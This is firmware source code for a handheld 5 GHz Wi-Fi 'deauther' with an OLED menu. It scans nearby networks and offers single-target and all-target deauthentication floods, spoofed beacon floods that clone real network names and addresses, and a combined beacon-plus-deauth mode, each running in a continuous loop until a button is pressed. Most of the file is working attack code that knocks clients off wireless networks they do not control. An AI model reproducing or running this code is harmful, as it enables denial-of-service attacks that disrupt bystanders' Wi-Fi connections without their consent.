// Oled code made by warwick320 // updated by Cypher --> github.com/dkyazzentwatwa/cypher-5G-deauther

// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA27
#define BTN_UP PA15
#define BTN_OK PA13

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;

// Credentials for you Wifi network
char *ssid = "littlehakr";
char *pass = "123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
static const unsigned char PROGMEM image_network_not_connected_bits[] = { 0x82, 0x0e, 0x44, 0x0a, 0x28, 0x0a, 0x10, 0x0a, 0x28, 0xea, 0x44, 0xaa, 0x82, 0xaa, 0x00, 0xaa, 0x0e, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0xea, 0xaa, 0xaa, 0xaa, 0xee, 0xee, 0x00, 0x00 };
static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}


void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Single Attack...");
  display.display();
  while (true) {
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
  }
}
void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Attacking All...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}
void BecaonDeauth() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Becaon+Deauth Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      }
    }
  }
}
void Becaon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Becaon Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
      }
    }
  }
}
// Custom UI elements
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawProgressBar(int x, int y, int width, int height, int progress) {
  display.drawRect(x, y, width, height, WHITE);
  display.fillRect(x + 2, y + 2, (width - 4) * progress / 100, height - 4, WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawStatusBar(const char *status) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(status);
  display.setTextColor(WHITE);
}



void drawMainMenu(int selectedIndex) {
  display.clearDisplay();

  // Status bar
  drawStatusBar("MAIN MENU");

  // Frame
  drawFrame();

  // Menu items with enhanced visual style
  const char *menuItems[] = { "Attack", "Scan", "Select" };
  for (int i = 0; i < 3; i++) {
    drawMenuItem(20 + (i * 15), menuItems[i], i == selectedIndex);
  }
  display.display();
}

void drawScanScreen() {
  display.clearDisplay();
  drawFrame();
  drawStatusBar("SCANNING");

  // Animated scanning effect
  static const char *frames[] = { "/", "-", "\\", "|" };
  for (int i = 0; i < 20; i++) {
    display.setCursor(48, 30);
    display.setTextSize(1);
    display.print("Scanning ");
    display.print(frames[i % 4]);
    drawProgressBar(20, 45, SCREEN_WIDTH - 40, 8, i * 5);
    display.display();
    delay(250);
  }
}

void drawNetworkList(const String &selectedSSID, const String &channelType, int scrollIndex) {
  display.clearDisplay();
  drawFrame();
  drawStatusBar("NETWORKS");

  // Network info box
  display.drawRect(4, 20, SCREEN_WIDTH - 8, 30, WHITE);
  display.setCursor(8, 24);
  display.print("SSID: ");

  // Truncate SSID if too long
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 13) {
    displaySSID = displaySSID.substring(0, 10) + "...";
  }
  display.print(displaySSID);

  // Channel type indicator
  display.drawRect(8, 35, 30, 12, WHITE);
  display.setCursor(10, 37);
  display.print(channelType);

  // Scroll indicators
  if (scrollIndex > 0) {
    display.fillTriangle(SCREEN_WIDTH - 12, 25, SCREEN_WIDTH - 8, 20, SCREEN_WIDTH - 4, 25, WHITE);
  }
  if (true) {  // Replace with actual condition for more items below
    display.fillTriangle(SCREEN_WIDTH - 12, 45, SCREEN_WIDTH - 8, 50, SCREEN_WIDTH - 4, 45, WHITE);
  }

  display.display();
}

void drawAttackScreen(int attackType) {
  display.clearDisplay();
  drawFrame();

  // Warning banner
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print("ATTACK IN PROGRESS");

  display.setTextColor(WHITE);
  display.setCursor(10, 20);

  // Attack type indicator
  const char *attackTypes[] = {
    "SINGLE DEAUTH",
    "ALL DEAUTH",
    "BEACON",
    "BEACON+DEAUTH"
  };

  if (attackType >= 0 && attackType < 4) {
    display.print(attackTypes[attackType]);
  }

  // Animated attack indicator
  static const char patterns[] = { '.', 'o', 'O', 'o' };
  for (int i = 0; i < sizeof(patterns); i++) {
    display.setCursor(10, 35);
    display.print("Attack in progress ");
    display.print(patterns[i]);
    display.display();
    delay(200);
  }
}
void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextSize(1);       // Set text size to normal
  display.setTextColor(WHITE);  // Set text color to white
  display.setCursor(6, 7);
  display.print("little hakr presents");
  display.setCursor(24, 48);
  //display.setFont(&Org_01);
  display.print("5 G H Z");
  //display.setFont(&Org_01);
  display.setCursor(4, 55);
  display.print("d e a u t h e r");
  display.drawBitmap(1, 20, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(112, 35, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(45, 19, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(68, 13, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 34, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(106, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(109, 48, image_network_not_connected_bits, 15, 16, 1);
  //display.setFont(&Org_01);
  display.drawBitmap(88, 25, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(9, 35, image_cross_contour_bits, 11, 16, 1);
  display.display();
  delay(2000);
}

// New function to handle attack menu and execution
void attackLoop() {
  int attackState = 0;
  bool running = true;
  // Add this: Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawFrame();
    drawStatusBar("ATTACK MODE");

    // Draw attack options
    const char *attackTypes[] = { "Single Deauth", "All Deauth", "Beacon", "Beacon+Deauth", "Back" };
    for (int i = 0; i < 5; i++) {
      drawMenuItem(15 + (i * 10), attackTypes[i], i == attackState);
    }
    display.display();

    // Handle button inputs
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (attackState == 4) {  // Back option
        running = false;
      } else {
        // Execute selected attack
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0:
            Single();
            break;
          case 1:
            All();
            break;
          case 2:
            Becaon();
            break;
          case 3:
            BecaonDeauth();
            break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState < 4) attackState++;
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState > 0) attackState--;
    }
  }
}

// New function to handle network selection
void networkSelectionLoop() {
  bool running = true;
  // Add this: Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawNetworkList(SelectedSSID, SSIDCh, scrollindex);

    // Modified button handling
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      // Wait for button release before exiting
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
      running = false;
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {  // Added -1 to prevent overflow
        scrollindex++;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindex > 0) {
        scrollindex--;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      }
    }

    display.display();
    delay(50);  // Add small delay to prevent display flickering
  }
}

void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}

void loop() {
  unsigned long currentTime = millis();

  // Draw the enhanced main menu interface
  drawMainMenu(menustate);

  // Handle OK button press
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      if (okstate) {
        switch (menustate) {
          case 0:  // Attack
            // Show attack options and handle attack execution
            display.clearDisplay();
            attackLoop();
            break;

          case 1:  // Scan
            // Execute scan with animation
            display.clearDisplay();
            drawScanScreen();
            if (scanNetworks() == 0) {
              drawStatusBar("SCAN COMPLETE");
              display.display();
              delay(1000);
            }
            break;

          case 2:  // Select Network
            // Show network selection interface
            networkSelectionLoop();
            break;
        }
      }
      lastOkTime = currentTime;
    }
  }

  // Handle Down button
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
        // Visual feedback
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }
      lastDownTime = currentTime;
    }
  }

  // Handle Up button
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 2) {
        menustate++;
        // Visual feedback
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }
      lastUpTime = currentTime;
    }
  }
}
